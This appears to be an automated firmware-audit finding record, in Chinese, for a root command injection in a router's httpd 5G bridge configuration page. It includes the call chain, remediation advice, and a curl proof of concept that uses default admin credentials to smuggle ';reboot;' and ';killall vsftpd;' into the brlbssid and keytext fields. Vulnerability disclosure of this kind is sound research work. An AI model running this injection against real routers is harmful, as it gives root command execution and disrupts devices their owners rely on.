@@ -1,0 +1,33 @@
+{
+  "job_id": "3a1f3c822c22",
+  "title": "httpd 5G 桥接 WLAN 配置命令注入（brlbssid/keytext → iwconfig → system/execFormatCmd，root 执行）",
+  "severity": "critical",
+  "confidence": 0.55,
+  "vuln_class": "cmdi",
+  "cwe": "CWE-78",
+  "binary_md5": "9582aa23b0bc2de099b9997b09457d01",
+  "binary_path": "firmware/binwalk_extracted/firmware.extracted/100000/squashfs-root/usr/bin/httpd",
+  "reachability": "static-only",
+  "summary": "httpd 5G 无线桥接(client/bridge)配置页把 brlbssid（目标 AP BSSID）原样拼入 system(\"iwconfig ath%d ap %s\")，把 keytext（WEP/WPA 密钥，64 字节）原样拼入 execFormatCmd(\"iwconfig ath%d key [%d] s:%s\")→/bin/sh -c；两个字段均只做 '-'/':'、大小写改写（不影响 ; $() 等元字符），保存后 5G WLAN 重新初始化即以 root 执行注入命令（CWE-78）",
+  "evidence": [
+    "入口：/userRpm/WlanNetworkRpm_5g.htm handler sub_46DBB0(0x46dbb0)，Save 分支调用 sub_46D18C(0x46d18c)",
+    "sub_46D18C(0x46d18c)：wdsbrl=2(Bridge) 时 brlssid→strncpy(byte_5F2550,0x20)；brlbssid 仅做 '-'→':'、小写→大写改写后 strncpy(&byte_5F2571,0x12)（; 等元字符原样保留）；keytext→strncpy(&byte_5F2590,0x40)（keytype 2..4，64 字节任意串）——三项均无 shell 元字符过滤",
+    "持久化：swWlanBasicCfgSet_5G(0x4c930c) 写入 5G basic cfg(NVRAM 镜像 dword_5C2E14,0x168 字节)；映射关系由 swWlanStaCfgGen_5G(0x4c933c) 结构确认：+220=目标 SSID、+253=目标 BSSID、+272=安全模式、+276=密钥索引、+284=密钥（与 byte_5F2550/0x21/byte_5F2571…/byte_5F2590 布局完全对应）",
+    "sink A：swWlanStaCfgInit_5G(0x4cab1c)：ucWlanBasicConfigGet_5G(v4); sprintf(s,\"iwconfig ath%d ap %s\",a1,&v4[253]); system(s); —— brlbssid 直接进 system()（以 root）",
+    "sink B：swWlanActiveStaSecurity_5G(0x4d0360) → sub_4D0298(0x4d0298)：execFormatCmd(\"iwconfig ath%d key [%d] s:%s\",a2,v3,a1+284) 与 \"…key [%d] %s\" —— keytext 直接拼入命令",
+    "触发：5G 工作模式为 client/bridge(mode=3/7，sub_4C5BD8 仅 mode==3 调用 swWlanStaCfgInit_5G) 时，5G WLAN 初始化/重启（保存后重开 WLAN 或重启设备）即执行；2G 同款 swWlanStaCfgInit(0x4c8fcc) 同样存在"
+  ],
+  "session_id": "s-mt4dtbug-e1c6",
+  "function_name": "swWlanStaCfgInit_5G",
+  "preconditions": "1) 可访问 httpd:80 且持有管理员会话；2) 5G 无线工作模式为 client/bridge(WLAN mode=3 或 7)且开启 WDS 桥接(wdsbrl=2)；3) brlbssid≤18 字节、keytext≤64 字节；4) 触发时机=保存后 5G WLAN 重新初始化（重启或模式切换）",
+  "exploit_sketch": "两步：① 以管理员会话保存恶意 5G bridge 配置（brlbssid ≤18 字节、keytext ≤64 字节，均可带 ; ；keytype=2 时走 sink B 的 \"s:%s\" 分支，keytype=3 走 \"%s\" 分支）；② 触发 5G WLAN 重初始化（保存后设备重启或切换 WLAN 模式）。执行形如：system(\"iwconfig ath2 ap 12:34;reboot;\") 或 sh -c \"iwconfig ath2 key [1] s:xx;killall vsftpd;\"",
+  "remediation": "对 brlssid/brlbssid/keytext 等进入 system/execFormatCmd 的字段做白名单校验（BSSID 限 hex+':' 格式、SSID 限可打印字符、口令限可见字符并转义 shell 元字符）；iwconfig 改用 execve 参数数组；保存前校验 WLAN 模式与字段绑定",
+  "poc": "# 前置：管理员会话（默认 admin/admin）；5G 工作模式需为 client/bridge（mode=3/7，wdsbrl=2）。\n# ① 保存恶意配置（brlbssid 限 18 字符，keytext 限 64 字符）：\ncurl -s -b 'Authorization=Basic YWRtaW46YWRtaW4=' -H 'Host: 192.168.1.1' -H 'Referer: http://192.168.1.1/userRpm/WlanNetworkRpm_5g.htm' \\\n 'http://192.168.1.1/userRpm/WlanNetworkRpm_5g.htm?Save=Save&mode=3&wdsbrl=2&brlssid=AP&brlbssid=12%3A34%3Breboot%3B&keytype=2&keytext=ab%3Bkillall%20vsftpd%3B'\n# ② 触发 5G WLAN 重新初始化（页面保存后重启设备，或切换 5G 模式开关）\n# 实际执行：sh -c \"iwconfig ath2 ap 12:34;reboot;\" → 设备重启（root 注入实证）\n# 或 sink B：sh -c \"iwconfig ath2 key [1] s:ab;killall vsftpd;\" → FTP 被关（可观测）\n# 注：2G 同款入口 /userRpm/WlanNetworkRpm.htm → swWlanStaCfgInit(0x4c8fcc) 同样可打",
+  "call_chain": "httpDispatcher(0x425d08) → sub_46DBB0(0x46dbb0) → sub_46D18C(0x46d18c) → swWlanBasicCfgSet_5G(0x4c930c) → swWlanInit_5G(0x4c5fb8)/sub_4C5BD8(0x4c5bd8) → swWlanStaCfgInit_5G(0x4cab1c) → system() 与 swWlanActiveStaSecurity_5G(0x4d0360) → sub_4D0298(0x4d0298) → execFormatCmd(0x5308cc) → tp_systemEx(0x52f1e8)",
+  "function_addr": "0x4cab1c",
+  "id": "F-mt4fdelp-18be",
+  "status": "draft",
+  "owner": "token-admin",
+  "recorded_at": "2026-08-22T13:39:42Z",
+  "history": []
+}
